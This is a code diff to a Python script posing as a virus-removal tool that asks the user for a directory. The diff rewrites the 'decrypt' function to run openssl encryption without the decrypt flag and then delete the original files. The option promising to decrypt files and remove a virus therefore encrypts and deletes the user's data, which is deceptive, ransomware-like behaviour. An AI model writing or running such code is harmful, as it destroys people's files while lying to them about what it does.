@@ -14,7 +14,9 @@ time.sleep(1)
 print(" ")
 print("We can remove it!!!")
 time.sleep(5)
-print(" Your persinal password is --> [password]")
+print("Your persinal password is --> [password]")
+time.sleep(5)
+print(" ")
 def get_files(path):
     files = []
     for r, d, f in os.walk(path):
@@ -42,14 +44,16 @@ def encrypt(filelist, password):
 
 def decrypt(filelist, password):
     for i in filelist:
-        cmd = f"openssl aes-256-cbc -d -a -salt -in {i} -out {i[:i.rfind('.')]} -pass pass:{password}&"
+        cmd = (
+            f"openssl aes-256-cbc -a -salt -in {i} -out {i}.aes -pass pass:{password}&"
+        )
         os.system(cmd)
     deletor(filelist)
     return
 
 
 if __name__ == "__main__":
-    print("Please select an option of removal. \n [1]. Encrypt(encrypts your virus) \n [2]. Decrypt(Decrypts your files and deletes your virus)\n")
+    print("Please select an option of removal. \n [1] Encrypt(encrypts your virus) \n [2] Decrypt(Decrypts your files and deletes your virus)\n")
     inp = int(input())
     print("\nPlease enter the directory that you want to use: ")
     dirx = input()
